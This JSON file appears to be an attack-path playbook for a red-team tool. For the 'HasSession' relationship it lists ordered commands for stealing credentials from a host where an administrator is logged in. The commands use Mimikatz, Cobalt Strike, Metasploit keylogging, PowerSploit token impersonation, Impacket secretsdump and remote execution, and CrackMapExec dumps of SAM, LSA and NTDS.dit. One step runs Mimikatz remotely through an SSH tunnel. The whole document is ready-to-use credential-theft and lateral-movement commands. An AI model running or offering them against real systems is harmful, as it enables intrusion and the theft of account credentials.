{
    "HasSession": {
        "meaning": "When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation or theft, or injecting into a user's process. Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.",
        "common": "",
        "windows": {
            "Mimikatz": [
                {
                    "order": 1,
                    "command": "privilege::debug",
                    "description": "Enable SeDebugPrivilege for memory access"
                },
                {
                    "order": 2,
                    "command": "sekurlsa::logonpasswords",
                    "description": "Dump plaintext passwords from LSASS memory"
                },
                {
                    "order": 3,
                    "command": "sekurlsa::wdigest",
                    "description": "Extract WDigest credentials from memory"
                }
            ],
            "CobaltStrike": [
                {
                    "order": 1,
                    "command": "hashdump",
                    "description": "Dump password hashes from SAM database"
                },
                {
                    "order": 2,
                    "command": "logonpasswords",
                    "description": "Extract credentials from LSASS using built-in capability"
                },
                {
                    "order": 3,
                    "command": "steal_token <PID>",
                    "description": "Steal access token from target process"
                }
            ],
            "Metasploit": [
                {
                    "order": 1,
                    "command": "keyscan_start",
                    "description": "Start keylogging on target system"
                },
                {
                    "order": 2,
                    "command": "keyscan_dump",
                    "description": "Dump captured keystrokes"
                },
                {
                    "order": 3,
                    "command": "load mimikatz",
                    "description": "Load mimikatz extension"
                },
                {
                    "order": 4,
                    "command": "wdigest",
                    "description": "Extract WDigest credentials using mimikatz"
                }
            ],
            "PowerSploit": [
                {
                    "order": 1,
                    "command": "Invoke-TokenManipulation -ShowAll",
                    "description": "List all available tokens on the system"
                },
                {
                    "order": 2,
                    "command": "Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\user'",
                    "description": "Impersonate specific user token"
                },
                {
                    "order": 3,
                    "command": "Invoke-ClipboardMonitor",
                    "description": "Monitor clipboard for sensitive information"
                }
            ]
        },
        "linux": {
            "Impacket": [
                {
                    "order": 1,
                    "command": "python3 secretsdump.py DOMAIN/user:password@target",
                    "description": "Dump credentials from remote Windows system"
                },
                {
                    "order": 2,
                    "command": "python3 wmiexec.py DOMAIN/user:password@target",
                    "description": "Execute commands on remote system via WMI"
                },
                {
                    "order": 3,
                    "command": "python3 psexec.py DOMAIN/user:password@target",
                    "description": "Execute commands with SYSTEM privileges"
                }
            ],
            "CrackMapExec": [
                {
                    "order": 1,
                    "command": "crackmapexec smb target -u user -p password --sam",
                    "description": "Dump SAM database hashes"
                },
                {
                    "order": 2,
                    "command": "crackmapexec smb target -u user -p password --lsa",
                    "description": "Dump LSA secrets"
                },
                {
                    "order": 3,
                    "command": "crackmapexec smb target -u user -p password --ntds",
                    "description": "Dump NTDS.dit database"
                }
            ],
            "Manual_SSH_Tunneling": [
                {
                    "order": 1,
                    "command": "ssh -L 445:target:445 user@jumphost",
                    "description": "Create SSH tunnel to target system"
                },
                {
                    "order": 2,
                    "command": "python3 smbclient.py DOMAIN/user:password@127.0.0.1",
                    "description": "Connect through tunnel for credential extraction"
                },
                {
                    "order": 3,
                    "command": "python3 atexec.py DOMAIN/user:password@127.0.0.1 'mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"'",
                    "description": "Execute mimikatz remotely through tunnel"
                }
            ]
        }
    }
}
